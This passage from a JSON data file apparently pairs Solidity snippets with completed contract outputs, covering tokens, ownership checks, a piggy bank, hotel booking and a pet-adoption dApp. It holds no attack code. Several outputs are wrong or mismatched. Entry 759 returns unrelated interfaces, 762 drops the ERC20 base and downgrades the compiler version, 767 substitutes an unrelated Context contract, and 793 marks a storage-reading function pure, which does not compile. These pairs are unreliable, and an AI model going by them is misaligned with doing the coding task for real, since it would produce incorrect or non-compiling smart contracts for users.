        "output": "pragma solidity ^0.8.9;\ncontract Bar {\n    function blockingFunction() public pure returns (bool val) {\n        assembly {\n            let freePointer := mload(0x40)\n            // store true\n            mstore(freePointer,true)\n            // return the stored value without return opcode\n            val:=mload(freePointer)\n        }      \n    }  \n}\n\ncontract Foo is Bar {\n    function foo() public pure returns(bool) {\n        bool result = blockingFunction();\n        require(result == true, \"msg\");\n        return result;\n    }\n}\n\n"
    },
    "758.sol": {
        "input": "struct Data {\n    uint256 number;\n    uint256 balance;\n}\n\n...\n\nfunction details(address owner) public view returns (Data[] memory data) {\n    uint256[] memory ownerPhones = phones[owner];\n    uint256 numPhones = ownerPhones.length;\n    data = new Data[](numPhones);\n\n    uint256 number;\n\n    for (uint256 i = 0; i < numPhones; i++) {\n        number = ownerPhones[i];\n        data[i].number = number;\n        data[i].balance = balance[number];\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Data {\n        uint256 number;\n        uint256 balance;\n    }\n    \n    mapping(address => uint256[]) public phones;\n    mapping(uint256 => uint256) public balance;\n\n    function details(address owner) public view returns (Data[] memory data) {\n        uint256[] memory ownerPhones = phones[owner];\n        uint256 numPhones = ownerPhones.length;\n        data = new Data[](numPhones);\n\n        uint256 number;\n\n        for (uint256 i = 0; i < numPhones; i++) {\n            number = ownerPhones[i];\n            data[i].number = number;\n            data[i].balance = balance[number];\n        }\n    }\n}\n"
    },
    "759.sol": {
        "input": "if(g.opposition == address(0) && msg.sender != host)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Host {\n\n    function host() external returns (uint256);\n}\n\ninterface Guitar {\n\n    function oppose(uint16) external;\n\n    function setOpposition(uint256) external;\n\n    function oppose(address) external;\n}\n\n"
    },
    "760.sol": {
        "input": "pragma solidity 0.8.7;\n\ncontract Master {\n  uint p;\n\n  function changep()public {\n    p = 1;\n  }\n\n  function getP() public view returns(uint) {\n    return p;\n  }\n}\n\n\ncontract CallerOne {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change1() public {\n    m.changep();\n  }\n\n  function Get1() public view returns(uint) {\n    return m.getP();\n  }\n}\n\ncontract CallerTwo {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change2() public {\n    m.changep();\n  }\n\n  function Get2() public view returns(uint) {\n    return m.getP();\n  }\n}\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\ncontract Master {\n  uint p;\n\n  function changep()public {\n    p = 1;\n  }\n\n  // we use the view mutator, that way we tell the compiler that this function wont change the state of the blockchain ( change state variable p value ).\n  function getP() public view returns(uint) {\n    return p;\n  }\n}\n\n\ncontract CallerOne {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change1() public {\n    m.changep();\n  }\n\n  function Get1() public view returns(uint) {\n    return m.getP();\n  }\n}\n\ncontract CallerTwo {\n\n  Master m;\n\n  constructor(address _m) {\n    m = Master(_m);\n  }\n\n  function change2() public {\n    m.changep();\n  }\n\n  function Get2() public view returns(uint) {\n    return m.getP();\n  }\n}\n"
    },
    "761.sol": {
        "input": "import \"github.com/provable-things/ethereum-api/provableAPI_0.5.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ProvableAPI {\n\n    function getBlockNumber() external view returns (int256);\n\n}\n\ncontract SimpleProvableExample {\n\n    ProvableAPI public provable;\n\n    constructor(address _provable) {\n        provable = ProvableAPI(_provable);\n    }\n\n    function queryNumber() public view returns (int256) {\n        return provable.getBlockNumber();\n    }\n\n}\n\n"
    },
    "762.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MyT\") {\n    }\n\n    function transfer(address to, uint256 amount) override public payable returns (bool) {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyToken {\n    function transfer(address to, uint256 amount) public payable returns (uint);\n}\n\n"
    },
    "763.sol": {
        "input": "C c = C(address(0x123));\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract C {\n  function() public {}\n}\n\n"
    },
    "764.sol": {
        "input": "function invest(address referrer, uint8 plan) public payable {\n    uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\n    commissionWallet.transfer(fee);\n    emit FeePayed(msg.sender, fee);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CommissionWallet {\n    address public commissionWallet;\n\n    constructor (address admin, address payable recipient) {\n        commissionWallet = recipient;\n    }\n}\n\n"
    },
    "765.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 public publicUint256;\n}\n\ncontract MyChildContract is MyContract {\n\n    function setValue(uint256 _value) external {\n        publicUint256 = _value;\n    }\n\n    function getValue() external view returns (uint256) {\n        return publicUint256;\n    }\n\n    function getValue2() external view returns (uint256) {\n        return this.publicUint256();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    // external contracts can only read the value\n    // using the autogenerated getter function\n    uint256 public publicUint256;\n}\n\ncontract MyChildContract is MyContract {\n    // derived contracts can both get and set the value\n\n    function setValue(uint256 _value) external {\n        publicUint256 = _value;\n    }\n\n    function getValue() external view returns (uint256) {\n        return publicUint256;\n    }\n\n    function getValue2() external view returns (uint256) {\n        return this.publicUint256();\n    }\n}\n\n"
    },
    "766.sol": {
        "input": "pragma solidity ^0.8.7;\ncontract Debugging2 {\n    uint256 counter = 200;\n}\n\npragma solidity ^0.8.7;\ncontract Debugging {\n    uint256 counter;\n    constructor(uint256 _counter) {\n        counter = _counter;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Debugging {\n    uint256 counter;\n    constructor(uint256 _counter) {\n        counter = _counter;\n    }\n\n    function increaseCounter() public {\n        counter += 1;\n    }\n}\n"
    },
    "767.sol": {
        "input": " require(msg.sender==minter)\n\n    address public _minter;\n\n\n    constructor(address minter_){\n        _minter=minter_;        \n     }\n\n\n",
        "output": "pragma solidity ^0.7.6;\n    abstract contract Context {\n        function _msgSender() internal virtual view returns (address payable) {\n            if (msg.sender == address(0)) {\n                return payable(msg.sender);\n            } else {\n                return msg.sender;\n            }\n        }\n    }\n\n"
    },
    "768.sol": {
        "input": "bool private paused;\nstring tokenName;\n mapping(address=>mapping(address=>uint)) public allowed;\n\nemit Burn(_from,_to,_tokens)\n\naddress payable public owner; \nconstructor() { \n        owner = payable(msg.sender); \n    }\n     \n\nfunction renounceOwnership() external onlyOwner { \n        emit OwnershipRenounced(owner); \n        owner = payable(address(0)); \n    }\n\nfunction transferOwnership(address _newOwner) external onlyOwner { \n        require(_newOwner != address(0)); \n        emit OwnershipTransferred(owner, _newOwner); \n        owner = payable(_newOwner); \n    } \n\nfunction updateOwner(address _newOwner) external onlyOwner { \n        require(_newOwner != address(0)); \n        emit OwnershipTransferred(owner, _newOwner); \n        owner = payable(_newOwner); \n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface IERC20 {\n        function mint(address account, uint256 amount) external;\n        function burn(address account, uint256 amount) external;\n        function getAllowed(address owner, address spender) external view returns(uint256);\n        function setAllowed(address owner, address spender, uint256 value) external;\n    }\n\n"
    },
    "769.sol": {
        "input": "pragma solidity >= 0.7.0 <0.9.0;\n\ncontract Challenge0 {\n    address public owner;\n    uint256 userBalance;\n    uint256 withdrawAmountVariable;\n    bool public canWithdraw = false;\n  \n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"You aren't the smart contact's owner\");\n        _;\n    }\n\n    function getBalance() public returns(uint) {\n    }\n\n    function withdrawAmount(uint256 amount) onlyOwner payable public {\n        require(msg.value == amount);\n        require(amount <= getBalance());\n        payable(msg.sender).transfer(amount);\n    }\n\n    function setUserBalance()external view {\n    }\n    \n    function getUserBalance()public view returns (uint256){\n        return address(this).balance;\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >= 0.7.0 <0.9.0;\n\ncontract Challenge0 {\n    address public owner;\n    uint256 userBalance;\n    uint256 withdrawAmountVariable;\n    bool public canWithdraw = false;\n  \n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"You aren't the smart contact's owner\");\n        _;\n    }\n\n    function getBalance() public returns(uint) {\n        // TODO: implement your logic\n    }\n\n    function withdrawAmount(uint256 amount) onlyOwner payable public {\n        require(msg.value == amount);\n        require(amount <= getBalance());\n        payable(msg.sender).transfer(amount);\n    }\n\n    function setUserBalance()external view {\n        // TODO: implement  your logic \n    }\n    \n    function getUserBalance()public view returns (uint256){\n        return address(this).balance;\n    }\n\n}\n\n"
    },
    "772.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        require(false, \"Only owner can call this function xxxxxxxxxx\");\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        require(false, \"no\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function foo() external {\n        require(false, \"Only owner can call this function xxxxxxxxxx\"); \n    }\n    function bar() payable public {\n        require(msg.sender == address(0), \"Only owner can call this function\");\n    }\n}\n\n"
    },
    "773.sol": {
        "input": "pragma solidity 0.8.19;\n\ninterface MyInterface{\n    function changeVariable() external;\n    function randomFunction() external;\n}\n\ncontract ContractInherits {\n    uint256 public a_variable;\n\n    function changeVariable() public {\n        a_variable = a_variable++;\n    }  \n}\n\ncontract MainContract {\n    MyInterface public immutable instanceOfContractInherits;\n\n    constructor(MyInterface _ContractInherits) {\n        instanceOfContractInherits = _ContractInherits;\n    }\n\n    function doStuff() public {\n        instanceOfContractInherits.changeVariable();\n        instanceOfContractInherits.randomFunction();\n    }\n}\n\n\ntransact to MainContract.doStuff errored: VM error: revert.\n\nrevert\n\nstatus  false Transaction mined but execution failed\n\n\n",
        "output": "pragma solidity ^0.8.9;\n  interface MyInterface {\n    function changeVariable() external;\n    function randomFunction() external;\n  }\n\n  contract ContractInherits {\n    uint256 public a_variable;\n\n    function changeVariable() public {\n        a_variable = a_variable++;\n    }  \n  }\n\n"
    },
    "774.sol": {
        "input": " \npragma solidity >= 0.6.0 < 0.9.0;\n \ncontract Sample{\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    receive() external payable { \n    }\n    \n    fallback() external payable {\n    }\n    \n    function getBalance() public view returns (uint){\n        return address(this).balance;\n    }\n\n    function transferEther(address payable recipient, uint amount) public returns(bool){\n        require(owner == msg.sender, \"transfer failed because you are not the owner.\"); \n        if (amount <= getBalance()) {\n            recipient.transfer(amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier: GPL-3.0\n \npragma solidity >= 0.6.0 < 0.9.0;\n \ncontract Sample{\n    \n    address public owner;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    receive() external payable { \n    }\n    \n    fallback() external payable {\n    }\n    \n    function getBalance() public view returns (uint){\n        return address(this).balance;\n    }\n\n    // this function is for sending the wei/ether OUT from this smart contract (address) to another contract/external account.\n    function transferEther(address payable recipient, uint amount) public returns(bool){\n        require(owner == msg.sender, \"transfer failed because you are not the owner.\"); // \n        if (amount <= getBalance()) {\n            recipient.transfer(amount);\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n"
    },
    "775.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Structing {\n    struct DataOne {\n        uint indexOne;\n        address toOne;\n    }\n\n    struct DataTwo {\n        uint indexTwo;\n        address toTwo;\n    }\n\n    DataOne dataOne;\n    DataTwo dataTwo;\n\n\n    function getDataOne() public view returns (DataOne memory) { \n        return dataOne; \n    }\n\n    function getDataTwo() public view returns (DataTwo memory) { \n        return dataTwo; \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Structing {\n    // type definition\n    struct DataOne {\n        uint indexOne;\n        address toOne;\n    }\n\n    // type definition\n    struct DataTwo {\n        uint indexTwo;\n        address toTwo;\n    }\n\n    // typed properties\n    DataOne dataOne;\n    DataTwo dataTwo;\n\n    // TODO implement setters of `dataOne` and `dataTwo` properties\n\n    function getDataOne() public view returns (DataOne memory) { // returns type\n        return dataOne; // property name\n    }\n\n    function getDataTwo() public view returns (DataTwo memory) { // returns type\n        return dataTwo; // property name\n    }\n}\n\n"
    },
    "776.sol": {
        "input": "import \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract A is Ownable {\n\n    receive() external payable {}\n\n    function getCurrentBalance() public view onlyOwner returns (uint) {\n        return address(this).balance;\n    }\n}\n\ninterface I {\n    function getCurrentBalance() external view returns (uint) ;\n    function transferOwnership(address newOwner) external;\n}\n\n\ncontract B is Ownable {\n\n    I public itf = I(contract_A_address_); \n\n    receive() external payable {}\n\n    function getBalanceOfA() public view onlyOwner returns (uint) {\n        return itf.getCurrentBalance();\n    }\n\n    function changeAOwner(address newOwner) public onlyOwner{\n        itf.transferOwnership(newOwner);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface I {\n  \n  function getCurrentBalance() external view returns (uint);\n  \n  function transferOwnership(address newOwner) external;\n}\n\n"
    },
    "777.sol": {
        "input": " constructor() {\n    uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER_ADDRESS);\n  }\n\n  address public immutable override WETH;\n\nconstructor(address _factory, address _WETH) public {\n    factory = _factory;\n    WETH = _WETH;\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IUniswapV2Router02 {\n    // Interface methods here\n}\n\ncontract MyContract {\n    address public immutable factory;\n    address public immutable WETH;\n    IUniswapV2Router02 public immutable uniswapRouter;\n\n    constructor(address _factory, address _WETH, address UNISWAP_ROUTER_ADDRESS) {\n        factory = _factory;\n        WETH = _WETH;\n        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER_ADDRESS);\n    }\n}\n"
    },
    "778.sol": {
        "input": "transaction = await contract.createMarketItem(\n      nftAddress,\n      tokenId,\n      { value: (listingPrice) },\n      royalty,\n      index\n    );\n\ntransaction = await contract.createMarketItem(\n          nftAddress,\n          tokenId,\n          priceFromForm,\n          royalty,\n          index, \n          { value: (listingPrice) }\n\n        );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMarketplace {\n    function createMarketItem(\n        address nftAddress,\n        uint256 tokenId,\n        uint256 priceFromForm,\n        uint256 royalty,\n        uint256 index\n      )\n      external\n      returns (address);\n  }\n\n"
    },
    "779.sol": {
        "input": " var abiEnconde = new ABIEncode();\n\n var resultHash = abiEnconde.GetSha3ABIEncodedPacked(\n          new ABIValue(\"address\", msg1),\n          new ABIValue(\"uint256\", amount),\n          new ABIValue(\"uint256\", nonce));\n\n var messageHashed = \"0x\" + Convert.ToHexString(resultHash).ToLower();\n var signature1 = signer1.Sign(resultHash, new EthECKey(privateKey));\n\nfunction getMessageHash(address add,uint256 amount,uint256 nonce ) public pure returns (bytes32) {\n    return keccak256(abi.encodePacked(add,amount,nonce)); \n}\n\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHashMessage = keccak256(abi.encodePacked(prefix,getMessageHash(msg1,amount,nonce)));\n    \n address signer = ecrecover(prefixedHashMessage, _v, _r, _s);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface EthECKey {\n    function sign(bytes calldata _message) external returns (bytes memory _signature);\n}\n\n"
    },
    "780.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract FallbackContract {\n    uint256 public invalidFunctionCalls;\n\n    constructor () {\n        invalidFunctionCalls = 0;\n    }\n\n    fallback() external {\n        invalidFunctionCalls += 1;\n    }\n}\n\n\n",
        "output": "// Contract A\n// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.0;\n\ncontract FallbackContract {\n    uint256 public invalidFunctionCalls;\n\n    constructor () {\n        invalidFunctionCalls = 0;\n    }\n\n    fallback() external {\n        invalidFunctionCalls += 1;\n    }\n}\n\n"
    },
    "781.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract TrainingResults {\n    enum Stage {\n        NONE,\n        STAGE_1,\n        STAGE_2,\n        COMPLETED\n    }\n\n    mapping (address => Stage) public participantStage;\n\n    function setParticipantStage(address _graduate, Stage _stage) external {\n        require(msg.sender == address(0x123), \"Not authorized\");\n        participantStage[_graduate] = _stage;\n    }\n}\n\npragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract TrainingResults is ERC721 {\n    constructor() ERC721(\"TrainingResults\", \"TR\") {}\n\n    function _beforeTokenTransfer(address from,address to, uint256 tokenId) override internal {\n        require(msg.sender == address(0x123), \"Cannot transfer tokens\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TrainingResults {\n    \n    enum Stage {\n        NONE,\n        STAGE_1,\n        STAGE_2,\n        COMPLETED\n    }\n    \n    mapping (address => Stage) public participantStage;\n    \n    function setParticipantStage(address _graduate, Stage _stage) external {\n        require(msg.sender == address(0x123), \"Not authorized\");\n        participantStage[_graduate] = _stage;\n    }\n}\n\n"
    },
    "782.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    int number = 100; \n\n    function foo() public {\n        int anotherNumber = 100; \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    int number = 100; // implicit `storage` location of a property\n\n    function foo() public {\n        int anotherNumber = 100; // implicit `memory` location of a variable\n    }\n}\n\n"
    },
    "783.sol": {
        "input": "function burn(uint256 _value) public {\n    \n    emit Transfer(msg.sender, address(0), _value)\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n    function burn(uint256 _value) public;\n}\n\n"
    },
    "784.sol": {
        "input": "contract MyContract {\n    mapping (string => address) tokenUsers;\n\n    function addWhitelist(\n        address _t,\n        bytes32 _something,\n        string memory _id\n    ) public {\n        tokenUsers[_id] = msg.sender;\n        ITargetContract(_t).addCandidateIdToWhitelist(_something, _id);\n    }\n\n    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4) {\n        ITargetContract.safeTransferFrom(\n            address(this),\n            tokenUsers[_tokenId],\n            _stringToUint(_tokenId)\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ITargetContract {\n    function addCandidateIdToWhitelist(\n        bytes32 _something,\n        string memory _id\n    ) external;\n\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) external;\n\n    function tokenOfWhitelist(uint256 index) external view returns(uint256 tokenId);\n}\n\n"
    },
    "786.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Hello {\n    constructor(string memory text1, string memory text2) {}\n}\n\ncontract World {\n    function foo() external {\n        new Hello(\"constructor\", \"params\");\n\n        Hello(address(0x123));\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Hello {\n    constructor(string memory text1, string memory text2) {}\n}\n\ncontract World {\n    function foo() external {\n        // deploying new contract\n        new Hello(\"constructor\", \"params\");\n\n        // pointing to an already deployed contract\n        Hello(address(0x123));\n    }\n}\n\n"
    },
    "787.sol": {
        "input": "         function bookroom1() public payable uptofee{                  \n            require(booked.isOccupied == false, \"This room is alraeady occupied\");              \n            payable(owner).transfer(msg.value); \n            hotelroomsarray[0].isOccupied = true;                          \n            bookertoroom[msg.sender] = hotelroomsarray[0];\n            bookers.push(msg.sender);       \n            addrtoamntpaid[msg.sender] = msg.value; \n            count++;                \n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract HotelBooking {\n    address public owner;\n    uint public fee;\n    uint public count;\n\n    struct Room {\n        bool isOccupied;\n    }\n\n    Room[] public hotelroomsarray;\n    \n    mapping(address => Room) public bookertoroom;\n    mapping(address => uint) public addrtoamntpaid;\n    address[] public bookers;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only the contract owner can call this function\");\n        _;\n    }\n\n    modifier uptofee {\n        require(msg.value <= fee, \"Amount should be less than or equal to fee\");\n        _;\n    }\n\n    constructor(uint _roomCount, uint _fee) {\n        owner = msg.sender;\n        fee = _fee;\n        \n        for(uint i = 0; i < _roomCount; i++) {\n            hotelroomsarray.push(Room({\n                isOccupied: false\n            }));\n        }\n    }\n\n    function bookroom1() public payable uptofee {                  \n        require(hotelroomsarray[0].isOccupied == false, \"This room is already occupied\");              \n        payable(owner).transfer(msg.value); \n        hotelroomsarray[0].isOccupied = true;                          \n        bookertoroom[msg.sender] = hotelroomsarray[0];\n        bookers.push(msg.sender);       \n        addrtoamntpaid[msg.sender] = msg.value; \n        count++;                \n    }\n\n    function getBookers() public view returns (address[] memory) {\n        return bookers;\n    }\n\n    function getRoomStatus(uint index) public view returns (bool) {\n        return hotelroomsarray[index].isOccupied;\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\n"
    },
    "788.sol": {
        "input": "function tokenFallback(address _from, uint _value, bytes _data) {\n}\n\nfunction tokenFallback(address _from, uint _value, bytes _data) {\n    _from;\n    _value;\n    _data;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC721 {\n    function tokenFallback(address _from, uint _value, bytes _data)\n        external;\n}\n\ncontract Token {\n    function tokenFallback(address _from, uint _value, bytes _data)\n        external {\n        _from;\n        _value;\n        _data;\n    }\n}\n\n"
    },
    "789.sol": {
        "input": "App = {\n  web3Provider: null,\n  accounts: [],\n  contracts: {},\n\n  init: async function() {\n    $.getJSON('../pets.json', function(data) {\n      var petsRow = $('#petsRow');\n      var petTemplate = $('#petTemplate');\n\n      for (i = 0; i < data.length; i ++) {\n        petTemplate.find('.panel-title').text(data[i].name);\n        petTemplate.find('img').attr('src', data[i].picture);\n        petTemplate.find('.pet-breed').text(data[i].breed);\n        petTemplate.find('.pet-age').text(data[i].age);\n        petTemplate.find('.pet-location').text(data[i].location);\n        petTemplate.find('.btn-adopt').attr('data-id', data[i].id);\n        petTemplate.find('.btn-return').attr('data-id', data[i].id);\n\n        petsRow.append(petTemplate.html());\n      }\n    });\n\n    return await App.initWeb3();\n  },\n\n  initWeb3: async function() {\n\n    if (window.ethereum){\n      try {\n        App.accounts = await window.ethereum.request({ method: \"eth_requestAccounts\" });\n      } catch (error) {\n        console.error(\"User denied account access\");\n      }\n      \n      console.log(\"Account[0]: \"+App.accounts[0]);\n      \n      App.web3Provider = window.ethereum;\n      console.log(\"modern dapp browser\");\n    }\n    else if (window.web3) {\n      App.web3Provider = window.web3.currentProvider;\n      App.accounts = window.eth.accounts;\n      console.log(\"legacy dapp browser\");\n    }\n    else {\n      App.web3Provider = new Web3.providers.HttpProvider('http:\n    }\n    \n\n    return App.initContract();\n    \n  },\n\n  initContract: function() {\n\n    $.getJSON('Adoption.json', function(data) {\n      var AdoptionArtifact = data;\n      try { App.contracts.Adoption = TruffleContract(AdoptionArtifact); } catch (error) { console.error(error); }\n\n      try {\n        App.contracts.Adoption.setProvider(App.web3Provider);\n      } catch (error){\n        console.log(error);\n      }\n      return App.markAdopted();\n    });\n\n    return App.bindEvents();\n  },\n\n  bindEvents: function() {\n    $(document).on('click', '.btn-adopt', App.handleAdopt);\n    $(document).on('click', '.btn-return', App.handleReturn);\n  },\n\n  markAdopted: function() {\n\n    var adoptionInstance;\n    App.contracts.Adoption.deployed().then(function(instance) {\n      adoptionInstance = instance;\n\n      return adoptionInstance.getAdopters.call();\n    }).then(function(adopters) {\n        \n        for(i=0;i<adopters.length;i++){\n            if (adopters[i] != '0x0000000000000000000000000000000000000000') {\n                if (adopters[i] == App.accounts[0]){\n                    $('.panel-pet').eq(i).find('.btn-return').text('Return').attr('disabled', false);\n                    $('.panel-pet').eq(i).find('.btn-adopt').text('Adopted').attr('disabled', true);\n                } else {\n                    $('.panel-pet').eq(i).find('.btn-return').text('-').attr('disabled', true);\n                    $('.panel-pet').eq(i).find('.btn-adopt').text('Adopted').attr('disabled', true);\n                }\n            } else {\n                $('.panel-pet').eq(i).find('.btn-return').text('-').attr('disabled', true);\n            }\n        }\n\n        \n    }).catch(function(err) {\n      console.log(err.message);\n    });\n  },\n\n  handleReturn: function(event) {\n    event.preventDefault();\n    \n    var petId = parseInt($(event.target).data('id'));\n    \n    console.log(\"handleReturn petId: \"+petId+\" Account[0]: \"+App.accounts[0]);\n    console.log(\"petID:\"+petId);\n    console.log(\"Account[0]: \"+App.accounts[0]);\n    \n    var adoptionInstance;\n    App.contracts.Adoption.deployed().then(function(instance) {\n      adoptionInstance = instance;\n\n      return adoptionInstance.returnPet(petId, {from: App.accounts[0]});\n    }).then(function(result){\n        App.markAdopted();\n    });\n    \n  },\n\n\n  handleAdopt: function(event) {\n    event.preventDefault();\n\n    var petId = parseInt($(event.target).data('id'));\n    console.log(\"handleAdopt petId: \"+petId+\" Account[0]: \"+App.accounts[0]);\n    console.log(\"petId:\"+petId);\n\n    var adoptionInstance;\n    App.contracts.Adoption.deployed().then(function(instance) {\n      adoptionInstance = instance;\n\n      return adoptionInstance.adopt(petId, {from: App.accounts[0]});\n    }).then(function(result){\n        App.markAdopted();\n    });\n    \n  }\n\n};\n\n$(function() {\n  $(window).load(function() {\n    App.init();\n  });\n});\n\npragma solidity ^0.5.0;\n\ncontract Adoption {\n    address[16] public adopters;\n\n    function adopt(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15);\n\n        adopters[petId] = msg.sender;\n\n        return petId;\n    }\n\n    function getAdopters() public view returns (address[16] memory) {\n        return adopters;\n    }\n    \n    function returnPet(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15);\n        \n        require(msg.sender == adopters[petId]);\n        \n        adopters[petId] = address(0);\n        \n        return petId;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Adoption {\n    address[16] public adopters;\n\n    function adopt(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15);\n\n        adopters[petId] = msg.sender;\n\n        return petId;\n    }\n\n    function getAdopters() public view returns (address[16] memory) {\n        return adopters;\n    }\n    \n    function returnPet(uint petId) public returns (uint) {\n        require(petId >= 0 && petId <= 15);\n        \n        require(msg.sender == adopters[petId]);\n        \n        adopters[petId] = address(0);\n        \n        return petId;\n    }\n\n}\n\n"
    },
    "790.sol": {
        "input": "function returnStuff() public returns (uint256, uint256) {\n   return (1, 3);\n}\n\n( , uint256 ourNum) = returnStuff();\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Test {\n\n    function returnStuff() public returns (uint256, uint256);\n\n    function() external payable {\n       ( , uint256 ourNum) = returnStuff();\n       require(ourNum == 3, \"Bad return from returnStuff\");\n    }\n\n}\n\n"
    },
    "791.sol": {
        "input": "    Counters.Counter public _votingId;\n\n    _votingId.increment();\n    uint256 idNumber=_votingId.current();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Counters {\n\n    function increment() external;\n}\n\n"
    },
    "792.sol": {
        "input": "constructor() {\n    creator=msg.sendor;\n    deposits=0;\n}\n\npragma solidity ^0.8.0;\n\ncontract PiggyBank {\n    address creator;\n    uint deposits;\n\n    constructor() {\n        creator=msg.sender;\n        deposits=0;\n    }\n\n    function deposit() public payable returns(uint) {\n        if(msg.value>0) {\n            deposits=deposits+1;\n        }\n        return getNumberofDeposits();  \n    }\n\n    function getNumberofDeposits() public view returns(uint) {\n        return deposits;\n    }\n    \n    function Killl() public {\n        if(msg.sender==creator) {\n            selfdestruct(payable(creator));\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PiggyBank {\n    \n    address creator;\n    \n    uint deposits;\n    \n    constructor() {\n        creator=msg.sender;\n        deposits=0;\n    }\n    \n    function deposit() public payable returns(uint) {\n        if(msg.value>0) {\n            deposits=deposits+1;\n        }\n        return getNumberofDeposits();  \n    }\n    \n    function getNumberofDeposits() public view returns(uint) {\n        return deposits;\n    }\n    \n    \n    function Killl() public {\n        if(msg.sender==creator) {\n            selfdestruct(payable(creator));\n        }\n    }\n}\n\n"
    },
    "793.sol": {
        "input": "contract Temp{\n\n    MainContract main;\n\n    constructor(MainContract _main) {\n        main = _main;\n    }\n    \n\n    function getData(uint number) public view returns(string memory){\n        return main.get(number);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.16;\ncontract Main {\n    \n    string[6] public data;\n    \n    function get(uint number) external pure returns(string memory) {\n        return data[number];\n    }\n}\n\n"
    },
    "794.sol": {
        "input": "enum Animal {CAT, DOG}\nmapping(Animal => int8) maps;\n\nconstructor() {\n        maps[Animal.CAT] = 10;\n}\n\nfunction decrementAnimal(Animal _animal) public {\n        maps[_animal] -= 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lib_DecrementAnimals {\n    enum Animal {CAT, DOG}\n    mapping(Animal => int8) maps;\n\n    constructor() {\n            maps[Animal.CAT] = 10;\n    }\n\n    function decrementAnimal(Animal _animal) public {\n            maps[_animal] -= 1;\n    }\n}\n\n"
    },
    "795.sol": {
